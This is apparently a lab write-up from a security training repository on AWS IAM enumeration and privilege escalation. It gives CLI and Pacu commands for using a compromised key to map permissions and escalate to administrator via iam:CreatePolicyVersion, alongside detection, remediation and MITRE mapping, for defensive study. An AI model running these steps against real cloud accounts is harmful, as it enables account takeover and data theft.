> **English** | [Italiano](README.md)

# AWS IAM enumeration & privilege escalation

> - **Phase:** Cloud Security - Identity Attack (AWS IAM)
> - **Visibility:** Medium - API calls are recorded in CloudTrail; enumeration generates `Describe`/`List`/`Get` events visible to an attentive defender
> - **Prerequisites:** A set of compromised AWS credentials (access key + secret) - from a leak, metadata SSRF, secrets in code; AWS CLI; enumerate-iam/Pacu
> - **Output:** Finding CLOUD-001; map of the permissions of the compromised identity; privilege escalation path toward administrative privileges

- **Operating Environment:** AWS (author's lab account), AWS CLI, Pacu
- **Starting point:** a low-privilege IAM key pair
- **Main tools:** aws-cli, enumerate-iam, Pacu, ScoutSuite

---

## Executive summary

In the cloud, identity is the new perimeter. There is no longer a border firewall to get past: whoever holds a valid credential is "inside", and what they can do depends entirely on the IAM (Identity and Access Management) permissions associated with that credential. Attacking cloud infrastructure is therefore, first of all, an attack on identity: obtaining a credential, understanding what it allows and turning a limited access into an administrative one.

IAM enumeration is the first step after obtaining a credential (from a leak on GitHub, from an SSRF on the metadata service, from a hardcoded secret). It consists of mapping what that identity can do: which services, which resources, which actions. Finding CLOUD-001 documents this enumeration and, most importantly, the search for a **privilege escalation** path - a chain of misconfigured permissions that leads from a limited role to administrator privileges.

The reference model is the **Shared Responsibility Model**: AWS protects the infrastructure (hardware, physical network, hypervisor), the customer protects what they put into it (data, configurations, and above all the IAM accesses). The vast majority of cloud compromises do not derive from AWS bugs but from IAM misconfigured on the customer side - exactly what this finding explores.

---

## Folder structure

```
IAM-enumeration/
+-- README.md      # this file: IAM enumeration and privilege escalation (CLOUD-001)
+-- img/           # enumerate-iam output and Pacu privesc chains
```

---

## Permission enumeration and privilege escalation

**Finding ID:** `CLOUD-001` | **Severity:** `Critical` (an IAM privilege escalation chain leads from a limited credential to administrator of the account)

### Operational context

Once a credential is obtained, the first question is "who am I and what can I do?". `aws sts get-caller-identity` answers the first; the enumeration of the permissions the second. Since IAM is often configured too permissively, the analysis of the permissions frequently reveals an escalation path: a seemingly harmless permission (`iam:PassRole`, `iam:CreatePolicyVersion`, `lambda:CreateFunction`) that, combined, allows elevation to admin.

### PoC - phase 1: identity identification

```Bash
# Who am I? (identity associated with the compromised credentials)
aws sts get-caller-identity
```

```
{
  "UserId": "AIDA...EXAMPLE",
  "Account": "123456789012",
  "Arn": "arn:aws:iam::123456789012:user/svc-deploy"   <-- compromised user
}
```

### PoC - phase 2: permission enumeration

```Bash
# Brute enumeration of the accessible APIs (enumerate-iam)
python3 enumerate-iam.py --access-key AKIA... --secret-key ...
```

```
[+] iam.list_users                    -> ALLOWED
[+] iam.list_attached_user_policies   -> ALLOWED
[+] iam.create_policy_version         -> ALLOWED    <-- dangerous permission (privesc)
[+] s3.list_buckets                   -> ALLOWED
```

### PoC - phase 3: privilege escalation path

```Bash
# The user can create a new version of a policy attached to it:
# iam:CreatePolicyVersion allows rewriting its own permissions -> admin
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/svc-deploy-policy \
  --policy-document file://admin.json \
  --set-as-default
```

```
# admin.json grants "Action": "*", "Resource": "*"
{ "PolicyVersion": { "VersionId": "v2", "IsDefaultVersion": true } }
[+] svc-deploy now has full administrative privileges   <-- account takeover (CLOUD-001)
```

### PoC - automation with Pacu

```Bash
# Pacu ("Metasploit for AWS") automates enumeration and privesc
pacu
> import_keys svc-deploy
> run iam__enum_permissions
> run iam__privesc_scan          # automatically searches the 20+ known privesc paths
```

```
[iam__privesc_scan] Escalation method found: CreatePolicyVersion
[iam__privesc_scan] Confirmed path to AdministratorAccess   <-- privesc confirmed
```

### Remediation

- **Least privilege:** every identity must have only the strictly necessary permissions; avoid wildcards (`Action: "*"`, `Resource: "*"`) and the dangerous IAM permissions (`iam:*`, `CreatePolicyVersion`, unconstrained `PassRole`)
- **Permission boundaries and SCP:** use Permission Boundaries and Service Control Policies (Organizations) to set an unbreachable ceiling on the privileges, even in case of misconfigured IAM
- **Privesc detection:** tools like Prowler and ScoutSuite (`../../../Tooling/`) identify the privesc chains before an attacker; audit regularly
- **Rotation and monitoring:** rotate the keys, disable the unused ones, monitor CloudTrail for enumeration patterns (massive `Describe`/`List`) and for the use of dangerous APIs (`CreatePolicyVersion`)

---

## Lab experience

The paradigm shift compared to the on-premise modules was stark. In Linux/Windows privilege escalation (module 04) I looked for SUID, kernel exploits, misconfigured services; here the entire attack was API calls to an identity service. There was no "system" to break into, only permissions to query and chain. This made concrete the mantra "identity is the new perimeter": cloud security is, in very large part, the correctness of the IAM configuration.

The most instructive discovery was how subtle the difference is between a harmless permission and a catastrophic one. `iam:CreatePolicyVersion` looks like routine administration, but it allows an identity to rewrite its own permissions - a direct path to admin. The list of the 20+ IAM privesc techniques documented by Rhino Security shows that most of these paths arise from combinations of permissions that, taken individually, seem reasonable. The complexity of IAM is itself the vulnerability.

Pacu made the attack almost trivial, but the real lesson was defensive. Running `iam__privesc_scan` as an attacker is powerful; running Prowler or ScoutSuite as a defender finds exactly the same chains, first. The symmetry is perfect: the same graph of permissions the attacker traverses to elevate, the defender analyzes to close it. In the cloud, the audit of the configuration is the primary defense.

---

## Theoretical analysis: identity as the attack surface

The cloud dissolves the traditional network perimeter. On-premise, the defense is stratified geographically: perimeter firewall, segmentation, then the host. In the cloud, every service is a public API endpoint and the only access control is identity: whoever presents a valid credential is authorized for what that credential allows. There is no network "inside" and "outside"; there is only "what this identity can do". The perimeter is no longer spatial but logical, defined by the IAM policies.

This shifts the entire attack surface onto the configuration of the accesses. A well-made IAM (least privilege, boundaries, no privesc path) makes the account defensible even if a credential leaks: the attacker obtains only what that specific identity allowed, without paths of expansion. A poorly-made IAM turns any leak into a potential account takeover, because a limited credential becomes the starting point of a chain toward admin.

The complexity of IAM is structurally its Achilles' heel. With hundreds of services, thousands of possible actions and policies that combine (user + group + role + resource-based), the space of configurations is enormous and the interactions non-obvious. A permission that is safe in isolation can open an escalation path in combination with another. This makes automatic analysis (Pacu offensively, Prowler/ScoutSuite defensively) not a luxury but a necessity: no human can reason by hand over a real cloud permission graph. The defense is understanding your own IAM better than the attacker understands it.

---

## Real-World scenario: Post-Exploitation projection

> This section describes how this finding would fit into a real engagement, from both the attacker (Red Team) and defender (Blue Team) perspectives.

### Attacker perspective (red team)

**Starting point:** administrative privileges on the AWS account obtained via IAM privesc from a limited credential (CLOUD-001).

**Immediate next step:** consolidation of the access and action on objectives - access to all the data (S3, RDS), creation of persistence credentials, exploration of the resources.

**Projected kill chain:**

```
[CLOUD-001] Limited credential -> IAM privesc -> Administrator
        |
        v
Persistence: new access key / backdoor role / scheduled Lambda
        |
        v
Data access: S3 (CLOUD-002), RDS snapshots, Secrets Manager
        |
        v
Exfiltration / destruction / resource abuse (cryptomining)
        |
        v
(optional) pivoting toward linked accounts in the Organization
```

**Potential impact:** administrative control of a cloud account is equivalent to on-premise Domain Admin, but with the difference that everything is accessible via API from anywhere. The attacker can exfiltrate entire datastores, create persistence that is hard to spot (an access key among thousands), and abuse the resources (cryptomining on expensive instances is a common monetization vector). In documented cloud breaches, the path credential-leak, IAM privesc, data exfiltration is the dominant pattern.

### Defender perspective (blue team)

**Detection:** CloudTrail records every API call. Massive enumeration (`List`/`Describe`) and the use of privesc APIs (`CreatePolicyVersion`, `AttachUserPolicy`) are detectable with GuardDuty or custom rules on the CloudTrail log.

**Indicators of Compromise (IOC):**
- Spike of `Describe`/`List`/`Get` calls from a single identity (enumeration)
- Unexpected calls to IAM modification APIs (`CreatePolicyVersion`, `PutUserPolicy`, `CreateAccessKey`)
- Use of credentials from anomalous IPs/geolocations or from tool user-agents (Pacu, boto3 scripts)
- Creation of new access keys or roles outside the normal processes

**Containment:** immediate disabling of the compromised credential; revocation of the sessions; review of the recent IAM changes (rollback of the malicious policy versions); audit of the touched resources.

**Eradication and hardening:**
- Rigorous least privilege + Permission Boundaries + SCP at the Organization level
- Removal of the privesc chains (audit with Prowler/ScoutSuite)
- Mandatory MFA, short-lived keys (STS roles instead of static access keys)
- GuardDuty active + alerting on CloudTrail for the sensitive APIs

**Defensive lesson:** in the cloud, the IAM configuration is the primary defense. A regular audit that closes the privesc paths makes the account resilient to credential leaks: if no limited identity can elevate, a leak remains contained. Cloud security is won before the incident, in the correctness of the policies, not during it.

---

## Reference tools

| tool | type | role | main use case |
| :--- | :--- | :--- | :--- |
| `aws-cli` | cloud cli | official | interaction with the aws apis, manual enumeration |
| `enumerate-iam` | permission enum | offensive | brute of the apis accessible from a credential |
| `Pacu` | exploitation framework | offensive | "metasploit for aws": enum, privesc, persistence |
| `ScoutSuite` | multi-cloud audit | defensive | audit of the configuration (`../../../Tooling/scoutsuite/`) |
| `Prowler` | security scanner | defensive | hundreds of checks, privesc chains (`../../../Tooling/prowler/`) |
| `PMapper` | iam graph analysis | defensive | permission graph to identify the escalation paths |

> **Recommended modern tool:** offensively `Pacu` for exploitation and `enumerate-iam` for quick recon. Defensively `Prowler` and `ScoutSuite` for the audit and `PMapper` for graph analysis of the IAM privesc paths. The symmetry is the point: the same paths the attacker looks for, the defender closes with these tools.

---

## MITRE ATT&CK mapping

> Reference: MITRE ATT&CK for Cloud (IaaS).

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| discovery | cloud infrastructure discovery | `T1580` | enumeration of the resources and permissions of the account (CLOUD-001) |
| privilege escalation | valid accounts: cloud accounts | `T1078.004` | escalation to administrative privileges via iam (CLOUD-001) |
| persistence | account manipulation: additional cloud credentials | `T1098.001` | creation of new persistence credentials |
| discovery | permission groups discovery: cloud groups | `T1069.003` | enumeration of the iam policies and groups |
| defense evasion | modify cloud compute infrastructure | `T1578` | modification of the iam policies for the escalation |

---

> **Note:** All documented activities were conducted on an AWS lab account owned by the author, with test credentials. Accessing and manipulating third-party cloud accounts without authorization is a crime (unauthorized access) and violates the provider's terms of service. Cloud security testing requires explicit authorization and, for some activities, notification to the provider. Techniques are documented for educational and authorized security assessment purposes.
